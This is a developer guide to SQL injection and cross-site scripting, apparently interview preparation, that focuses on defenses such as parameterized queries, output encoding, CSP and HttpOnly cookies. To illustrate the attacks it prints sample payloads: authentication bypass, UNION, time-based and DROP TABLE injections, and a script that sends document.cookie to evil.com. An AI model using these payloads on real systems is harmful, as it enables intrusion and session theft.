# SQL Injection & XSS

## SQL Injection

### What is SQL Injection?

SQL Injection is a vulnerability where user input is embedded directly into a SQL query without sanitization, allowing attackers to manipulate the query and execute arbitrary SQL commands against the database.

```
Vulnerable Code (Java):
String query = "SELECT * FROM users WHERE email = '" + email + "' AND password = '" + password + "'";

User inputs:
  email    = admin@example.com
  password = ' OR '1'='1

Resulting query:
SELECT * FROM users WHERE email = 'admin@example.com' AND password = '' OR '1'='1'

'1'='1' is always true -> returns ALL users -> attacker is logged in as admin
```

### Impact of SQL Injection

```
Authentication Bypass:  login without credentials
Data Theft:             SELECT * FROM credit_cards
Data Modification:      UPDATE users SET role='ADMIN' WHERE email='attacker@evil.com'
Data Deletion:          DROP TABLE users; --
OS Command Execution:   (via xp_cmdshell in MSSQL) run shell commands on DB server
```

### Types of SQL Injection

**1. Classic (In-band):** results returned directly in the response

```sql
-- UNION-based: extract data from other tables
' UNION SELECT username, password FROM users --
```

**2. Blind SQL Injection:** no data returned, but behavior differs based on true/false

```sql
-- Boolean-based: ask yes/no questions
' AND 1=1 --   (page loads normally)
' AND 1=2 --   (page breaks or returns no results)
-- Attacker deduces data one bit at a time

-- Time-based: infer data from response time
' AND SLEEP(5) --   (if vulnerable, response takes 5 extra seconds)
```

**3. Out-of-band:** data exfiltrated via DNS or HTTP requests (not via response)

### Prevention: Prepared Statements / Parameterized Queries

The fundamental fix: **never concatenate user input into SQL**. Use parameterized queries where the query structure is fixed and user input is passed separately as parameters — the DB treats parameters as data, never as SQL code.

**Java — JDBC Prepared Statement:**

```java
// VULNERABLE — string concatenation
String query = "SELECT * FROM users WHERE email = '" + email + "'";
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery(query);

// SAFE — parameterized query
String query = "SELECT * FROM users WHERE email = ?";
PreparedStatement stmt = conn.prepareStatement(query);
stmt.setString(1, email);   // parameter, not SQL code
ResultSet rs = stmt.executeQuery();
```

**Java — JPA / Spring Data:**

```java
// VULNERABLE — string concatenation in JPQL
@Query("SELECT u FROM User u WHERE u.email = '" + email + "'")
// Never do this!

// SAFE — named parameter binding
@Query("SELECT u FROM User u WHERE u.email = :email")
Optional<User> findByEmail(@Param("email") String email);

// Spring Data method name (fully safe — auto-generated)
Optional<User> findByEmail(String email);
```

**Java — Spring JdbcTemplate:**

```java
// SAFE — parameterized
String sql = "SELECT * FROM users WHERE email = ? AND status = ?";
List<User> users = jdbcTemplate.query(sql,
    new Object[]{ email, "ACTIVE" },
    new BeanPropertyRowMapper<>(User.class)
);
```

**Node.js — pg (PostgreSQL):**

```javascript
// VULNERABLE
const query = `SELECT * FROM users WHERE email = '${email}'`;
await pool.query(query);

// SAFE — parameterized
const result = await pool.query(
    'SELECT * FROM users WHERE email = $1',
    [email]   // parameter
);
```

**Node.js — Sequelize ORM:**

```javascript
// SAFE — ORM handles parameterization
const user = await User.findOne({ where: { email } });

// SAFE — literal with bind parameters
const users = await User.findAll({
    where: sequelize.literal('email = :email'),
    replacements: { email }
});

// DANGEROUS — never use raw with user input
User.findAll({ where: sequelize.literal(`email = '${email}'`) });
```

### Additional Defenses (Defense in Depth)

**1. Stored Procedures:** pre-compiled SQL that accepts only parameters. But they can still be vulnerable if they concatenate SQL inside the procedure — parameterization must be used inside the procedure too.

**2. Input Validation:** whitelist expected formats (e.g. email must match email regex, ID must be a positive integer). Reject input that doesn't match — never rely on this alone, but adds a layer.

```java
public void validateId(String id) {
    if (!id.matches("\\d+")) {
        throw new IllegalArgumentException("Invalid ID format");
    }
}
```

**3. Least Privilege DB User:** the app's DB user should only have the permissions it needs.

```sql
-- App user: read and write to specific tables
GRANT SELECT, INSERT, UPDATE ON orders TO app_user;
-- NOT: GRANT ALL PRIVILEGES; DROP TABLE access; etc.
```

**4. Web Application Firewall (WAF):** detect and block SQL injection patterns. Not a replacement for parameterization — a last-resort layer.

**5. Error Handling:** never expose DB error messages to users — they reveal table names, column names, and DB version.

```java
// DANGEROUS — exposes DB internals
catch (SQLException e) {
    return ResponseEntity.badRequest().body(e.getMessage()); // reveals SQL error

// SAFE — generic error
catch (SQLException e) {
    log.error("DB error", e);  // log internally
    return ResponseEntity.status(500).body("An error occurred");
}
```

---

## XSS (Cross-Site Scripting)

### What is XSS?

XSS is a vulnerability where an attacker injects malicious JavaScript into a web page that is then executed in the browsers of other users. Unlike CSRF which makes unauthorized requests, XSS runs code directly in the victim's browser — it can steal cookies, tokens, keystrokes, and hijack sessions.

```
Attacker posts a comment on a forum:
  <script>
    fetch('https://evil.com/steal?cookie=' + document.cookie)
  </script>

When another user views the page:
  Browser renders and executes this script
  User's session cookie is sent to evil.com
  Attacker uses the cookie to impersonate the user
```

### Types of XSS

**1. Stored XSS (Persistent) — Most Dangerous**

Malicious script is stored in the database and served to every user who views the page.

```
Attacker submits: comment = "<script>stealCookies()</script>"
Server stores this in DB
Every user who loads the page executes the script
```

**2. Reflected XSS (Non-Persistent)**

Script is embedded in the URL and reflected back in the response. The attacker tricks a user into clicking a malicious link.

```
Attacker crafts URL:
https://example.com/search?q=<script>stealCookies()</script>

If server echoes the query parameter in HTML without escaping:
<p>Search results for: <script>stealCookies()</script></p>

User's browser executes the script
```

**3. DOM-Based XSS**

Script is injected via DOM manipulation in client-side JavaScript, without the server being involved.

```javascript
// Vulnerable JS code
const name = location.hash.substring(1);  // reads URL fragment
document.getElementById('greeting').innerHTML = 'Hello, ' + name;

// Attacker's URL: https://example.com/#<img src=x onerror=stealCookies()>
// innerHTML parses HTML including the injected script
```

### Impact of XSS

```
Session Hijacking:     steal cookies -> impersonate users
Credential Theft:      keylogger reads username/password inputs
Token Theft:           steal localStorage tokens (if stored there)
Phishing:              redirect users to fake login page
Account Takeover:      change email/password via authenticated requests
Crypto Mining:         use victim's CPU
Defacement:            modify page content
```

### Prevention

#### 1. Output Encoding (Escaping) — Primary Defense

Encode user-provided data before rendering it in HTML. Convert HTML special characters to their safe equivalents.

```
& -> &amp;
< -> &lt;
> -> &gt;
" -> &quot;
' -> &#x27;
/ -> &#x2F;
```

**Java — Thymeleaf (auto-escapes by default):**

```html
<!-- SAFE — Thymeleaf escapes by default -->
<p th:text="${userComment}">...</p>

<!-- DANGEROUS — unescaped HTML rendering -->
<p th:utext="${userComment}">...</p>
```

**Java — Manual encoding (OWASP Java Encoder):**

```java
import org.owasp.encoder.Encode;

// For HTML context
String safe = Encode.forHtml(userInput);

// For JavaScript context (in <script> tags)
String safe = Encode.forJavaScript(userInput);

// For HTML attribute context
String safe = Encode.forHtmlAttribute(userInput);
```

**Node.js / HTML — escape user input:**

```javascript
const he = require('he');  // HTML entities library

function escapeHtml(str) {
    return he.escape(str);
}

// In template literals
const html = `<p>Comment: ${escapeHtml(userComment)}</p>`;
```

#### 2. Content Security Policy (CSP)

CSP is an HTTP header that tells the browser which scripts, styles, and resources are allowed to execute — the most powerful defense against XSS.

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com; style-src 'self'; img-src 'self' data:; object-src 'none'
```

With this policy:
- Scripts only from the same origin or `cdn.example.com`
- Inline scripts (`<script>...</script>`) blocked by default
- `eval()` blocked by default
- No plugins/objects

Even if XSS is injected, the browser refuses to execute scripts that don't come from allowed sources.

**Spring Boot CSP header:**

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http.headers(headers -> headers
            .contentSecurityPolicy(csp -> csp
                .policyDirectives("default-src 'self'; " +
                                  "script-src 'self'; " +
                                  "style-src 'self' 'unsafe-inline'; " +
                                  "img-src 'self' data: https:; " +
                                  "object-src 'none'")
            )
        );
        return http.build();
    }
}
```

**Node.js (helmet):**

```javascript
const helmet = require('helmet');

app.use(helmet.contentSecurityPolicy({
    directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'"],
        styleSrc: ["'self'", "'unsafe-inline'"],
        imgSrc: ["'self'", "data:", "https:"],
        objectSrc: ["'none'"]
    }
}));
```

#### 3. HttpOnly and Secure Cookies

```
Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Strict
```

- `HttpOnly` — JavaScript cannot access this cookie via `document.cookie`. Even if XSS runs, it can't steal this cookie.
- `Secure` — cookie only sent over HTTPS.
- `SameSite` — prevents CSRF.

**This is why storing JWT in `localStorage` is risky** — XSS can read `localStorage`. Storing JWT in an `HttpOnly` cookie means XSS can't steal the token.

#### 4. DOMPurify — Sanitize HTML Input

When you must accept HTML input (rich text editors), use a well-tested sanitizer to strip dangerous tags/attributes:

```javascript
const DOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');

const window = new JSDOM('').window;
const purify = DOMPurify(window);

// Strips <script>, onerror, javascript: URLs, etc.
const cleanHtml = purify.sanitize(userHtml);

// Only allow specific safe tags
const strictClean = purify.sanitize(userHtml, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],
    ALLOWED_ATTR: ['href']
});
```

Never use `innerHTML` with unsanitized user content.

#### 5. Avoid Dangerous APIs

```javascript
// DANGEROUS — parse HTML, execute scripts
element.innerHTML = userInput;
document.write(userInput);
eval(userInput);

// SAFE — treat as text, not HTML
element.textContent = userInput;
element.setAttribute('value', userInput);
```

### React XSS

React escapes output by default — `{userInput}` in JSX is safe. But `dangerouslySetInnerHTML` bypasses escaping:

```jsx
// SAFE — React escapes this
<p>{userComment}</p>

// DANGEROUS — bypasses React escaping
<p dangerouslySetInnerHTML={{ __html: userComment }} />
// Only use with DOMPurify-sanitized input
<p dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userComment) }} />
```

## SQL Injection vs XSS — Comparison

| | SQL Injection | XSS |
|---|---|---|
| Attack vector | Malicious SQL in user input | Malicious JavaScript in user input |
| Target | Database | Other users' browsers |
| Primary damage | Data theft, manipulation, DB destruction | Session hijacking, credential theft, client-side attacks |
| Primary fix | Parameterized queries | Output encoding, CSP |
| Where fixed | Server-side (query layer) | Server-side (output layer) + Client-side (CSP) |

## Interview Questions

**Q1: What is SQL Injection and how do you prevent it?**

SQL Injection embeds user input directly into SQL queries, allowing attackers to manipulate the query. Prevention: always use parameterized queries (prepared statements) where the query structure is fixed and user input is passed as bound parameters — the DB treats them as data, never as SQL. Additionally: least-privilege DB users, input validation, and hiding DB errors from users.

**Q2: Why are parameterized queries safe against SQL Injection?**

In a parameterized query, the SQL structure is sent to the DB first and compiled. Parameters are then sent separately and inserted as literal values — the DB never re-parses the SQL after receiving parameters. An attacker's `' OR '1'='1` becomes a literal string value being compared, not part of the SQL syntax.

**Q3: What is the difference between Stored and Reflected XSS?**

Stored XSS: malicious script is saved in the DB and served to every user who views the affected page — persistent and broadly impactful. Reflected XSS: script is embedded in a URL and "reflected" back in the immediate response — requires tricking a specific user into clicking a crafted link. Stored XSS is more dangerous because it affects all users automatically.

**Q4: What is Content Security Policy (CSP) and how does it help against XSS?**

CSP is an HTTP response header that declares which sources are allowed to load and execute scripts, styles, and other resources. Even if an attacker injects a `<script>` tag, the browser refuses to execute it if it doesn't come from an allowed source. It's a defense-in-depth layer — you should still encode output, but CSP drastically reduces the impact of any missed encoding.

**Q5: Why is `innerHTML` dangerous and what should you use instead?**

`innerHTML` parses the assigned string as HTML, including executing script tags and event handlers (`onerror`, `onclick`). If user input is assigned to `innerHTML`, any injected script runs. Use `textContent` instead — it assigns the string as plain text without HTML parsing. When HTML rendering is required, sanitize with DOMPurify first.

**Q6: How does making a cookie `HttpOnly` protect against XSS?**

An `HttpOnly` cookie cannot be accessed via `document.cookie` or any JavaScript API. Even if an XSS attack successfully injects and runs malicious code in the page, it can't read the session cookie to exfiltrate it. The cookie is still sent automatically by the browser on HTTP requests — it's just invisible to JavaScript.
